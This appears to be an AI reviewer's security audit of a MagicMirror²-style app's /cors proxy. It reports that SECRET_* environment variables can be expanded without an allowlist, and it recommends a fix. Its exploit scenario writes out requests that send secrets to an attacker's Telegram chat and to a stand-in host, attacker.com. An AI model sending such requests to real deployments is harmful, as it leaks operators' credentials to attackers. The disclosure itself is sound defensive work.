summary:
The change adds three server-side files of a MagicMirror²-style app: `js/app.js` (bootstrap / module-helper loading), `js/node_helper.js` (base NodeHelper, socket handling, per-module secret allowlist) and `js/server_functions.js` (the `/cors` proxy, `**SECRET_***` placeholder expansion, `/env`, `/version`, `/`).

What I examined:
- `cors()` end to end, plus the code it depends on that is outside the diff: `js/server.js` (route wiring, helmet/CSP config, socket.io CORS), `js/ip_access_control.js` (the only gate on `/cors`), `js/defaults.js` and `js/utils.js` (config loading and the redaction that produces `configRedacted`).
- The SSRF controls in `cors()`: scheme allowlist, literal `localhost` check, `dns.promises.lookup` + `ipaddr.process(...).range() !== "unicast"`, and the per-request undici `Agent` whose `connect.lookup` pins every connection (including redirects) to the address that was range-checked. I probed this for the usual bypasses — decimal/octal and percent-encoded hosts (the WHATWG parser normalises before the check), IPv6 and IPv4-mapped forms (ipaddr handles them), DNS rebinding and redirect-to-internal (defeated by the pinned lookup), and a parser differential between `new URL(url)` and `undici.fetch(url)` (there is none, both use the same parser). I found no bypass; this part looks soundly built.
- The secret-expansion feature at both call sites. `js/node_helper.js` enforces a per-module allowlist derived from the module's redacted config; `js/server_functions.js:75` calls the same helper with no allowlist, and the helper's check is written to be skipped when the argument is absent. That is the one finding I reported: any caller of `/cors` can interpolate any `SECRET_*` environment variable into a URL they choose, bounded only by the destination-domain whitelist (and not bounded at all if the `cors` config value is anything other than the three recognised strings, which nothing validates).
- `js/app.js`: the `Spawn(..., { shell: true })` of systeminformation takes no attacker-controlled input; module folder/helper paths come from the (trusted) config file. Nothing reportable.

Considered and deliberately not reported: the `/cors` proxy returning remote bodies with the remote `Content-Type` on the mirror's own origin (an XSS-by-proxy primitive, made worse by `contentSecurityPolicy: false` in `js/defaults.js` and `Access-Control-Allow-Origin: *` in `js/ip_access_control.js`) — this is faithful to the pre-existing upstream proxy behaviour, is gated behind the non-default `cors: "allowAll"`, and under `allowAll` the secret expansion is explicitly disabled; the reflection of `req.url` into a `text/html` 400 response at line 68-70 (browsers percent-encode `<`/`>`, so I could not construct a victim-reachable payload).
unresolved: Exploitability of the reported finding depends on which hosts an operator puts in `corsDomainWhitelist` — I verified the secret is placed in an outbound request the attacker fully shapes, but whether it comes back to the attacker depends on the whitelisted endpoint (an attacker-usable sink such as a messaging/webhook API, or an API that echoes query parameters). I could not settle that from the repository, which is why I rated confidence medium.

The repository snapshot contains only the `js/` directory — no package.json, config samples, docs or tests. I could not check the documented/sample values for `cors`, `corsDomainWhitelist` and `ipWhitelist`, nor confirm the undici version's redirect and `connect.lookup` semantics from a lockfile; the SSRF reasoning about pinned redirects rests on undici's documented behaviour rather than on code I could read here.

`/cors` reachability: there is no authentication on the route, only the IP whitelist in `js/ip_access_control.js`, which defaults to loopback. I reported `reachable_without_authentication: yes` because no authentication control exists, but in a default-configured deployment the attacker must be on an allowed IP.

I did not audit the client-side files (`js/main.js`, `js/module.js`, `js/socketclient.js`) beyond confirming that `/config` functions are revived with `new Function` from server-supplied config; they are outside this change and I did not trace whether any untrusted value can reach that reviver.

verdict.reason: 1 finding(s) reported, none at or above the high threshold.

findings.title: CORS proxy substitutes any SECRET_* env var without an allowlist
findings.description:
`replaceSecretPlaceholder(input, allowedSecrets)` (js/server_functions.js:29-45) expands `**SECRET_NAME**` placeholders from `process.env`, and only restricts which secrets may be expanded when the optional second argument is supplied:

```
if (allowedSecrets && !allowedSecrets.has(secretName)) { return placeholder; }
return process.env[secretName] || placeholder;
```

The socket call site in js/node_helper.js:115 passes an allowlist built from the calling module's own redacted config (`getAllowedSecrets`), so a client can only trigger expansion of secrets that already belong to that module. The `/cors` call site at line 75 passes no allowlist at all, so the check is skipped entirely and *every* `SECRET_*` environment variable of the MagicMirror process can be interpolated into a URL chosen by whoever issued the HTTP request.

The URL string is fully attacker-controlled (`match[1]` of `url=(.+?)$` against the raw `req.url`), and the placeholder expansion happens before any destination check. The only remaining restriction is the destination-host check at line 99, which is a domain allowlist, not an authorization control: any endpoint on any whitelisted host can be used as the recipient of the secret (e.g. a whitelisted `api.telegram.org`, a whitelisted logging/webhook host, or any whitelisted API that echoes query parameters back in its response body, which is then proxied straight back to the caller at line 134).

Two aggravating factors I confirmed while tracing this:
- `global.config.cors` is never validated anywhere in the repo (no match for `cors` in check_config.js/defaults validation). Any value other than the three expected strings — e.g. `cors: "enabled"` or `cors: true` — fails open: line 58 does not block, `replaceSecretPlaceholder`'s `allowAll` bail-out at line 30 does not trigger, and the `allowWhitelist` domain check at line 99 does not apply. In that state every `SECRET_*` variable can be sent to a host of the attacker's choosing and the response is returned to them.
- `/cors` (js/server.js:132) has no authentication; the only gate is `ipAccessControl`, a network-level IP whitelist that defaults to loopback but which deployments routinely widen to the LAN or to `[]` (allow all).

The root cause is the fail-open optional parameter plus the one call site that omits it; js/node_helper.js:115 is the correct pattern.
findings.exploit_scenario:
Deployment with `hideConfigSecrets: true`, `cors: "allowWhitelist"`, `corsDomainWhitelist: ["api.telegram.org"]` (or any other whitelisted host with an attacker-usable sink or an echoing error response), and `ipWhitelist` widened to the LAN — the documented way to view the mirror from a phone. An unauthenticated attacker on that network requests:

GET /cors?url=https://api.telegram.org/bot<attacker_bot_token>/sendMessage?chat_id=<attacker>&text=**SECRET_HASS_TOKEN**

The server expands `SECRET_HASS_TOKEN` — a secret belonging to a completely different module — into the outbound URL and delivers it to the attacker's chat. Repeating with other names enumerates every `SECRET_*` variable. If the administrator has mistyped the `cors` value (e.g. `cors: "enabled"`), the same request works against `https://attacker.com/?leak=**SECRET_X**` with no host restriction at all, and the proxied response is returned to the attacker.
findings.recommendation: Make the allowlist mandatory rather than optional, so omission fails closed: `function replaceSecretPlaceholder (input, allowedSecrets = new Set())` and drop the `allowedSecrets &&` guard, i.e. always `if (!allowedSecrets.has(secretName)) return placeholder;`. For the `/cors` endpoint, derive the permitted set from the configuration rather than allowing everything — e.g. union of the placeholders present in `global.configRedacted` for the module that owns the request, or at minimum the set of placeholders that appear anywhere in the redacted config. Separately, validate `global.config.cors` at startup and reject any value that is not `disabled`/`allowAll`/`allowWhitelist` instead of falling through to the unrestricted path.
